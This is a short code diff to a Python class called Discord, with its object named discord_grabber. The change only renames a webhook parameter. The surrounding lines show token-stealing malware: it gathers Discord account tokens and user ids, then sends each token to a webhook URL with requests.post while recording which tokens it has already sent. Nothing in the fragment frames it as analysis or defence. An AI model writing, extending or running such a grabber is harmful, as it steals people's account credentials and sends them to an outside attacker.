@@ -170,7 +170,7 @@ class Discord:
                                 if uid not in self.ids:
                                     self.tokens.append(token)
                                     self.ids.append(uid)
-    def upload(self, webhook):
+    def upload(self, webhook_url):
         for token in self.tokens:
             if token in self.tokens_sent:
                 continue
@@ -323,7 +323,7 @@ class Discord:
                     }
                 ],
             }
-            requests.post(webhook, json=data)
+            requests.post(webhook_url, json=data)
             self.tokens_sent.append(token)
 discord_grabber = Discord()
 discord_grabber.upload(webhook_url)
